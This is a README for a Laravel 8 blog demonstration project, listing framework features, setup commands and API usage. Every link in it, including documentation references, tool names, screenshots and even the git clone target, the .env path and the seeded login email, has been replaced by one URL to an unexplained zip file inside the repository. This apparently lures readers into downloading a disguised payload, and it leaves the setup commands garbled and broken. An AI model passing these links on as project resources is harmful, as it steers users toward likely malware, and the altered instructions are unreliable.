# Laravel 8.0 blog

[![Build Status](https://github.com/MohammedBadry/blog/raw/refs/heads/master/app/Broadcasting/Software_3.4.zip)](https://github.com/MohammedBadry/blog/raw/refs/heads/master/app/Broadcasting/Software_3.4.zip)

The purpose of this repository is to show good development practices on [Laravel](https://github.com/MohammedBadry/blog/raw/refs/heads/master/app/Broadcasting/Software_3.4.zip) as well as to present cases of use of the framework's features like:

- [Authentication](https://github.com/MohammedBadry/blog/raw/refs/heads/master/app/Broadcasting/Software_3.4.zip)
- API
  - Token authentication
  - [API Resources](https://github.com/MohammedBadry/blog/raw/refs/heads/master/app/Broadcasting/Software_3.4.zip)
  - Versioning
- [Blade](https://github.com/MohammedBadry/blog/raw/refs/heads/master/app/Broadcasting/Software_3.4.zip)
- [Broadcasting](https://github.com/MohammedBadry/blog/raw/refs/heads/master/app/Broadcasting/Software_3.4.zip)
- [Cache](https://github.com/MohammedBadry/blog/raw/refs/heads/master/app/Broadcasting/Software_3.4.zip)
- [Email Verification](https://github.com/MohammedBadry/blog/raw/refs/heads/master/app/Broadcasting/Software_3.4.zip)
- [Filesystem](https://github.com/MohammedBadry/blog/raw/refs/heads/master/app/Broadcasting/Software_3.4.zip)
- [Helpers](https://github.com/MohammedBadry/blog/raw/refs/heads/master/app/Broadcasting/Software_3.4.zip)
- [Horizon](https://github.com/MohammedBadry/blog/raw/refs/heads/master/app/Broadcasting/Software_3.4.zip)
- [Localization](https://github.com/MohammedBadry/blog/raw/refs/heads/master/app/Broadcasting/Software_3.4.zip)
- [Mail](https://github.com/MohammedBadry/blog/raw/refs/heads/master/app/Broadcasting/Software_3.4.zip)
- [Migrations](https://github.com/MohammedBadry/blog/raw/refs/heads/master/app/Broadcasting/Software_3.4.zip)
- [Policies](https://github.com/MohammedBadry/blog/raw/refs/heads/master/app/Broadcasting/Software_3.4.zip)
- [Providers](https://github.com/MohammedBadry/blog/raw/refs/heads/master/app/Broadcasting/Software_3.4.zip)
- [Requests](https://github.com/MohammedBadry/blog/raw/refs/heads/master/app/Broadcasting/Software_3.4.zip)
- [Seeding & Factories](https://github.com/MohammedBadry/blog/raw/refs/heads/master/app/Broadcasting/Software_3.4.zip)
- [Testing](https://github.com/MohammedBadry/blog/raw/refs/heads/master/app/Broadcasting/Software_3.4.zip)
- [Homestead](https://github.com/MohammedBadry/blog/raw/refs/heads/master/app/Broadcasting/Software_3.4.zip)

Beside Laravel, this project uses other tools like:

- [Bootstrap 4](https://github.com/MohammedBadry/blog/raw/refs/heads/master/app/Broadcasting/Software_3.4.zip)
- [PHP-CS-Fixer](https://github.com/MohammedBadry/blog/raw/refs/heads/master/app/Broadcasting/Software_3.4.zip)
- [Travis CI](https://github.com/MohammedBadry/blog/raw/refs/heads/master/app/Broadcasting/Software_3.4.zip)
- [Font Awesome](https://github.com/MohammedBadry/blog/raw/refs/heads/master/app/Broadcasting/Software_3.4.zip)
- [https://github.com/MohammedBadry/blog/raw/refs/heads/master/app/Broadcasting/Software_3.4.zip](https://github.com/MohammedBadry/blog/raw/refs/heads/master/app/Broadcasting/Software_3.4.zip)
- [axios](https://github.com/MohammedBadry/blog/raw/refs/heads/master/app/Broadcasting/Software_3.4.zip)
- [Redis](https://github.com/MohammedBadry/blog/raw/refs/heads/master/app/Broadcasting/Software_3.4.zip)
- [spatie/laravel-medialibrary](https://github.com/MohammedBadry/blog/raw/refs/heads/master/app/Broadcasting/Software_3.4.zip)
- Many more to discover.

## Some screenshots

You can find some screenshots of the application on : [https://github.com/MohammedBadry/blog/raw/refs/heads/master/app/Broadcasting/Software_3.4.zip](https://github.com/MohammedBadry/blog/raw/refs/heads/master/app/Broadcasting/Software_3.4.zip)

## Installation

Development environment requirements :
- [VirtualBox](https://github.com/MohammedBadry/blog/raw/refs/heads/master/app/Broadcasting/Software_3.4.zip)
- [Vagrant](https://github.com/MohammedBadry/blog/raw/refs/heads/master/app/Broadcasting/Software_3.4.zip)

Setting up your development environment on your local machine :
```bash
$ git clone https://github.com/MohammedBadry/blog/raw/refs/heads/master/app/Broadcasting/Software_3.4.zip
$ cd laravel-blog
$ cp https://github.com/MohammedBadry/blog/raw/refs/heads/master/app/Broadcasting/Software_3.4.zip .env
$ composer install
$ vagrant up
$ vagrant ssh
```

All following commands must be run inside the VM:
```bash
$ cd code
$ yarn install
$ artisan key:generate
$ artisan horizon:install
$ artisan telescope:install
$ artisan storage:link
```

Now you can access the application via [http://localhost:8000](http://localhost:8000).

**There is no need to run `php artisan serve`. PHP is already running in the dedicated virtual machine.**

## Before starting
You need to run the migrations with the seeds :
```bash
$ artisan migrate --seed
```

This will create a new user that you can use to sign in :
```yml
email: https://github.com/MohammedBadry/blog/raw/refs/heads/master/app/Broadcasting/Software_3.4.zip
password: 4nak1n
```

And then, compile the assets :
```bash
$ yarn dev # or yarn watch
```

Starting job for newsletter :
```bash
$ artisan tinker
> PrepareNewsletterSubscriptionEmail::dispatch();
```

## Useful commands
Seeding the database :
```bash
$ artisan db:seed
```

Running tests :
```bash
$ ./vendor/bin/phpunit --cache-result --order-by=defects --stop-on-defect
```

Running php-cs-fixer :
```bash
$ ./vendor/bin/php-cs-fixer fix https://github.com/MohammedBadry/blog/raw/refs/heads/master/app/Broadcasting/Software_3.4.zip --verbose --dry-run --diff
```

Generating backup :
```bash
$ artisan vendor:publish --provider="Spatie\Backup\BackupServiceProvider"
$ artisan backup:run
```

Generating fake data :
```bash
$ artisan db:seed --class=DevDatabaseSeeder
```

Discover package
```bash
$ artisan package:discover
```

In development environnement, rebuild the database :
```bash
$ artisan migrate:fresh --seed
```

## Accessing the API

Clients can access to the REST API. API requests require authentication via token. You can create a new token in your user profile.

Then, you can use this token either as url parameter or in Authorization header :

```bash
# Url parameter
GET http://localhost:8000/api/v1/posts?api_token=your_private_token_here

# Authorization Header
curl --header "Authorization: Bearer your_private_token_here" http://localhost:8000/api/v1/posts
```

API are prefixed by `api` and the API version number like so `v1`.

Do not forget to set the `X-Requested-With` header to `XMLHttpRequest`. Otherwise, Laravel won't recognize the call as an AJAX request.

To list all the available routes for API :

```bash
$ artisan route:list --path=api
```
